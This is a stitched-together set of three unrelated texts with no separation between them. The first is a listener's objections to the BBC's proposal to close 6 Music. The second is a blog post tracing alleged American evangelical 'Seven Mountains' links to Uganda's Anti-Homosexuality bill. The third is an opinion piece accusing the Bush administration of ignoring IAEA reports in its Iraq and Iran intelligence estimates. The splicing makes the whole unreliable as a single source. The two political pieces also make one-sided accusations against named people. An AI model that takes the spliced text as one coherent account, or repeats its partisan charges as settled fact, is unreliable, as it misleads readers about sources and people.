For example , many BBC radio services are available on AM , FM and DAB radio , digital television and online devices .
However , the Trust recognises that some BBC services are still unavailable on the main platforms , such as FM or DAB , in parts of the UK .
The Trust believes that there is a fine balance to be struck here – between giving you the chance to receive BBC services in all the ways and devices you may have and making sure that the BBC does n’t spend too much on delivering BBC content to you , rather than on the content itself .
If you have particular views on how you expect BBC services to be available to you , please let us know .
It occurs to me that part of BBC 6 music 's problem is accessibility .
I do n't own a digital radio ( I listen to the station through my television ) and I imagine the same can be said for the majority of the population .
Technology is a wonderful thing , but it is unrealistic to assume that everyone is up to speed with it - I 'm certain many people who may have enjoyed 6 Music never even knew the station existed .
Proposed principle : Setting new boundaries for the BBC
The Trust has asked the Director - General to consider where the BBC could be clearer about the limits to its activities as we know there is considerable demand for this from other broadcasters and media companies and the BBC has a responsibility to consider its competitive impact on others .
The Director - General has set out a list of proposed limits to BBC activity .
These are : • Reducing the BBC offer in pop music radio by closing 6 Music • Closing niche services for teenagers : BBC Switch and Blast !
• Reducing BBC expenditure on programmes bought from abroad - for example , American films and dramas • Limiting BBC expenditure on sports rights •
Not offering any more localised services than the BBC already does – for example , new services for individual towns or cities •
Making the BBC website more focussed on particular areas .
The Trust has carried out work in some of these areas already and we support some aspects to these limits : making the BBC ’s website focussed and distinctive and setting limits to the BBC 's local media offer .
In many other areas , we recognise there are trade - offs .
For example , buying a US drama can mean that viewers are offered a high quality programme at lower cost than would be possible with a new British programme .
The Trust has not taken decisions in any of these areas and we will consider each one very carefully before doing so .
Do you think that the BBC should limit its activities in these areas ?
Once again , the focus of my objection is on your decision to close 6 Music .
I find it laughable that part of your justification for this is based on your " responsibility to consider its competitive impact on others " .
If you 're genuinely concerned about competitive impact , close either Radio 1 or 2 , or merge those stations .
If anything you 're offering is redundant , it 's the excessive output of commercial pop music already available across a huge variety of commercial radio stations .
Once again you incorrectly refer to 6 Music as a " pop music " station .
Pop music is in the minority of 6 Music 's output .
I can't help thinking that the decision to close the station has come from a group of people completely out of touch with music definitions and with very little idea of what 6 Music actually has to offer .
It certainly is n't treading on any other broadcaster 's toes , because there is nothing else like it on the radio .
My suspicions are further raised by the fact that the decision was laughably championed by Tory MP Ed Vaizey who had never actually listened to 6 Music .
After spending the weekend listening to the station he had so eagerly signed a death warrant for he made a spectacular u-turn and stated " I am now an avid listener to 6 Music " .
To conclude , it appears that the BBC is acting rashly and looking for the easiest route to saving money .
God forbid that they look to reducing bloated salaries or cutting back on their commercial music output , which is the only area which genuinely encroaches on competitor broadcasters ’ territory .
Throughout the survey , I could n’t help but notice how much emphasis is being placed on the notion that the BBC ’s overall “ pop music ” output should be reduced .
Surely the first port of call for this is either BBC Radio 1 or 2 ?
Have the decision makers ever actually listened to 6 Music , and do they know the difference between “ pop ” music and the more niche , alternative genres played by 6 Music DJs ?
Based on their spurious and flimsy arguments for closing the service , it would appear that they have n’t .
To all artists great and small who have enjoyed airplay on either BBC 6 Music or BBC Asian Network , you have a duty to support their future and speak out against the Director General ’s proposals if you have n’t already done so .
No matter how much or little impact you think that airplay had , you can rest assured that it presented your music to new listeners who would not otherwise have come across your music .
Are we really going to stand for having these incredibly precious services taken away from us to make way for yet more chart material ?
I for one am NOT .

Yesterday , Warren Throckmorton began delving into the “ Seven Mountains ” theology that has surfaced in investigations into American Evangelical ties to the current Anti-Homosexuality
Act which has been put before Uganda ’s Parliament .
Today , Bruce Wilson , of the New Apostolic Reformation Research Group , has published a major exposé on extensive ties between those behind Uganda ’s latest draconian proposal and American Evangelicals .
Again , “ Seven Mountains ” theology appears to be at the core .
According to news reports , the Anti-Homosexuality Act was tabled before Parliament on October 14 , but that was n’t the first time discussions surrounding the proposal occurred in the chamber .
A transcript of Parliamentary proceedings from April 29 , have come to light which show MP David Bahati first introducing the bill before Parliament .
This is likely to have been similar to the draft dated April 20 , 2009 that we obtained in September .
( The current bill is dated September 25 . )
According to the Parliamentary transcript , the Speaker noted several distinguished visitors in the gallery before turning the floor over to MP Bahati :
Let us hear from hon .
Bahati .
In connection with the motion he is moving , we have in the gallery Apostle Julius Peter Oyet , Vice - President of the Born Again Federation ; Pastor Dr Martin Sempa of the Family Policy Centre ; Stephen Langa , Family Life Network ; hon .
Godfrey Nyakaana ; the Mayor of Kampala City Council ; Julius , a young boy who was sodomised , and his mother .
His story has been in the press .
They are all here in the gallery .
Please , let us deal with them so that they can leave .
There is also George Oundo who came out to speak against homosexuality .
Please , let us balance the public good and our good since all of them are important .
We shall do them all very quickly .
Hon. Bahati .
For longtime BTB readers , many of these names are familiar .
Stephen Langa organized the anti-gay conference in Kampala in March featuring three American Anti-Gay activists which ultimately kicked off this latest round of anti-gay vigilantism and , eventually , this bill .
Martin Ssempa has enjoyed close ties with many American Evangelicals , most notably Saddleback Pastor Rick Warren .
Ssempa has used the latest anti-gay furor to exact revenge against rival pastors by accusing them of homosexuality .
Those accusations were unfounded , and Ssempa himself is the subject of a police investigation for filing false reports .
George Oundo is the unstable so - called “ ex - gay ” who participated in several acts of vigilantism in the media .
But one name we have n’t paid much attention to — and should — is that of the self - designated “ Apostle ” Julius Peter Oyet .
He ’s vice - president of the Born Again Federation , and umbrella group of some 10,000 Ugandan Pentecostal churches .
He is also head of Lifeline Ministries .
According to Throckmorton and Wilson , Oyet has gained favor and influence with Uganda President Yoweri Museveni for going to Northern Uganda and praying over territory once controlled by the rebel Lord\ ’s Resistance Army .
His prayers reportedly resulted in the “ miraculous ” return of hundreds of child soldiers abducted by the LRA , as well as other fantastic stories of miraculous healings , cleansing of poisoned rivers , casting out demons , and the like .
Oyet is an adherent to “ Seven Mountains ” theology , a Dominionist theology that calls upon Christians to “ establish the Kingdom of God on earth ” by claiming possession to “ the Seven Mountains of Culture namely : Business , Government , Religion , Family , Media , Education and Entertainment . ”
Warren Throckmorton explains :
This viewpoint seems to be quite popular among those who follow C. Peter Wagner\ ’s New Apostolic Reformation .
Wagner is the Presiding Apostle for the International Council of Apostles , a subsidiary of Global Harvest Ministries which admits new apostles by invitation only .
Wagner\ ’s 2008 book Dominion : How Kingdom Action Can Change the World , is described by the publisher as an exploration of “ the biblical roots of dominion theology . ”
According to Wagner , the task of the church is less about individual salvation and more about taking dominion over the culture by reclaiming seven domains : family , business , arts & entertainment , government , media , education , and religion .
Perhaps not so coincidentally , Caleb Lee Brundidge , one of the speakers at that anti-gay conference at Kampala last march , is a member of a group called Extreme Prophetic , which also adheres to Seven Mountains theology .
Bruce Wilson ’s report at Talk to Action takes up the thread from there :
Some observers have wondered if Purpose Driven Life author and mega-evangelist Rick Warren has had a role in the globally controversial bill , especially because of Warren ’s close association with Ugandan anti-gay activist Martin Ssempa and , more broadly , because Warren has refused to denounce the anti-gay bill .
To little notice , a charismatic network overseen by Warren ’s doctoral dissertation advisor , C. Peter Wagner , has played a major role in politically organizing and inspiring the Ugandan legislators who have spearheaded the anti-gay bill .
Wagner is the Convening Apostle in a movement of charismatic networks which has extended its reach from the United States to Uganda , and worldwide .
Under its umbrella of authority are virulently anti-gay apostles in the United States and Uganda including Lou Engle of TheCall , who led thousands of young people in a twelve hour November 1 , 2008 stadium rally in support of California ’s anti-gay marriage Proposition Eight .
The San Diego event closed with Engle , a member of Wagner ’s inner circle of “ prophets , ” calling for Christian martyrs .
Peter Wagner heads the New Apostolic Reformation , which he openly touts as an effort to take Christian dominion over the globe by putting “ born again ” believers around the world under the authority of these apostles and prophets .
Both C. Peter Wagner and Rick Warren want to transform the world , and both have proclaimed the advent of a second Reformation .
Wagner calls it the New Apostolic Reformation , while for Rick Warren this is a “ purpose driven ” effort powered by Warren ’s global P.E.A.C.E. Plan .
In Uganda both visions for societal transformation appear to include the categorical elimination of homosexuality – by any means .
The word “ transform ” is key .
Wilson identifies Julius Oyet as a one of Wagner ’s Apostles , and is featured in one of the movement ’s Transformations series of video documentaries .
Wilson says these videos “ depict cities and even whole nations transformed to earthly utopias when charismatic Christians take control of societal structures and government . ”
The “ Transformations ” ideas promoted these videos have spawned Transformation organizations around the world , including the International Transformation Network
Oyet is also identified as being the head of the Uganda division of the College of Prayer International .
BTB readers may recall from last month that MP David Bahati , who introduced the Anti-Homosexualty Act into Parliament , and MP Benson Obua - Ogwa , identified as one of the bill ’s cosponsors , are core members of the College of Prayer International ’s Uganda branch .
They were appointed as two of eight MP\’s to serve on the Christian “ servant leadership team ” in Parliament for three years .
Some parts of Wilson ’s report covers some of the same ground that we ’ve reported , but his well - researched report goes much deeper than anyone has been able to accomplish so far .
He does an excellent job of not only tying it all together , but demonstrating how Seven Mountains theology works , as adherents seek to infiltrate the seven spheres of cultural influence — particularly the governmental sphere .
He also documents the close ties that these groups have with the President and First Lady of Uganda .
For example :
A March 8th , 2007 news release , hosted on the official web site of Republic of Uganda State House , reveals the extent to which the Transformations model is being integrated into Ugandan government policy : “ President Yoweri Museveni and his wife Mrs. Janet Museveni today hosted at State House , Nakasero 2 officials of California based Harvest Evangelism .
Founder and President of Harvest Evangelism Mr. Ed Silvoso was accompanied by Mr. Graham Power . ”
According to the release , the Musevenis discussed with Silvoso and Power “ issues pertaining to investment opportunities in the country particularly road construction and the development of infrastructure . ”
Ed Silvoso is an apostle in C. Peter Wagner ’s International Coalition of Apostles and is CEO of the International Transformation Network ( ITN ) .
Janet Museveni has spoken at several Transformation conferences around the world including one hosted by Silvoso ’s Argentina - based ministry .
So now we see how Peter Wagner ’s “ Seven Mountain ” theology is having a very real impact in Uganda .
And with Rick Warren as Wagner ’s protegé , Warren ’s refusal to take a stand on the impending disaster in Uganda is starting to make sense .
One would think that denouncing such a draconian attempt at criminalization would be easy to denounce , but Warren ca n’t find it in his heart to do so .
The more we look at the ties between American Evangelicals and Uganda ’s political leadership , the more we see the true nature of what the American Evangelical movement has in store for LGBT people if they get their way .
One Uganda pastor called the proposal “ genocide . ”
That ’s an extreme word describing an extreme situation .
But the more we learn , the more it looks like it ’s not hyperbole after all .
This is real .

Four years ago , President Bush ordered Director of Central Intelligence George Tenet to prepare a National Intelligence Estimate to be used to " justify " to Congress the preemptive war against Iraq we now know he had already decided to launch .
Two years later , the Senate Intelligence Committee concluded that " Most of the major key judgments in the Intelligence Community ’s October 2002 National Intelligence Estimate  ‘ Iraq ’s Continuing Programs for Weapons of Mass Destruction ’  either overstated , or were not supported by , the underlying intelligence reporting . "
In particular , the assessment that Iraq “ is reconstituting its nuclear program ” was " not supported by the intelligence provided to the Committee . "
The Committee noted that prior to 1999 our intelligence community had been heavily dependent upon information obtained from United Nations inspectors .
True , in December 1998 , President Clinton had warned all UN inspectors to get out of Iraq or risk getting killed during Operation Desert Fox .
However , after Clinton quit bombing , International Atomic Energy Agency inspectors had been allowed back into Iraq ( in 2000 , 2001 , and 2002 ) to inspect all the remaining nuclear - related sites in Iraq  including Kuwaitha , where our " intelligence " had suggested the Iraqis might be doing something untoward  and found nothing untoward .
But Tenet ’s 2002 NIE did n’t even mention those IAEA inspections , much less the subsequent " null " reports the IAEA regularly made to the UN Security Council .
Why not ?
Well , obviously the Cheney Cabal did n’t want Congress to know  at least officially  that by 1994 all Saddam ’s nuclear programs had been verifiably destroyed and that he had made no attempt whatsoever to reconstitute them .
Inexplicably , the Senate Intelligence Committee did not even mention  much less decry  the failure of the intelligence community to base their 2002 NIE " assessments " of Saddam ’s nuclear program on those IAEA " null " reports .
There were , however , cries of anguish from those sent to Iraq on a fool ’s errand by Tenet : Never again produce an NIE that completely ignores the best intelligence , that of on - the - ground inspectors !
Last year , Dafna Linzer reported that the intelligence community had produced an NIE  still highly classified  about Iran .
" A major U.S. intelligence review has projected that Iran is about a decade away from manufacturing the key ingredient for a nuclear weapon , roughly doubling the previous estimate of five years , according to government sources with firsthand knowledge of the new analysis .
" The carefully hedged assessments , which represent consensus among U.S. intelligence agencies , contrast with forceful public statements by the White House .
Administration officials have asserted , but have not offered proof , that Tehran is moving determinedly toward a nuclear arsenal .
The new estimate could provide more time for diplomacy with Iran over its nuclear ambitions .
President Bush has said that he wants the crisis resolved diplomatically but that “ all options are on the table . ”
Linzer does n’t say whether the 2005 NIE on Iran ’s nuclear programs took into account at all  much less was largely based upon  the quarterly reports the on - the - ground IAEA inspectors had been making to the IAEA Board and to the Security Council .
And a year later , IAEA inspectors have yet to see any indication  much less evidence  that Iran has engaged in any activity involving the use of any amount of proscribed nuclear materials in furtherance of a military purpose .
Furthermore , if IAEA inspectors are allowed to continue safeguarding Iran ’s nuclear facilities , the Iranians will never succeed in producing any amount of weapons - grade enriched uranium , much less enough to make a nuclear weapon .
Nevertheless , the members of the Cheney Cabal continue to forcefully assert  without offering any proof whatsoever  that Iran has a nuclear weapons program that has already " reached a point of no return . "
Why ?
Apparently because we have pledged to not use nuclear weapons against those signatories to the Treaty on Nonproliferation of Nuclear Weapons who do n’t already have nukes .
So , when Bush says " all options are on the table , " he ’s telling the Iranians that our no-nuking pledge wo n’t keep him from nuking them because he has it on authority 
God Almighty , apparently  that the Iranians have nukes .
Now comes Linzer to tell us the House Intelligence Committee has just issued a staff report [ . pdf ]  authored principally by Frederick Fleitz  that uses information contained in the IAEA " null " reports to come to conclusions diametrically opposed to those of the IAEA .
You may recall that Undersecretary Bolton and his chief of staff Fleitz were point - men in the largely successful attempts by the Cheney Cabal to cook the intelligence in the run-up to the preemptive attack on Iraq .
Looks like they ’re at it again .
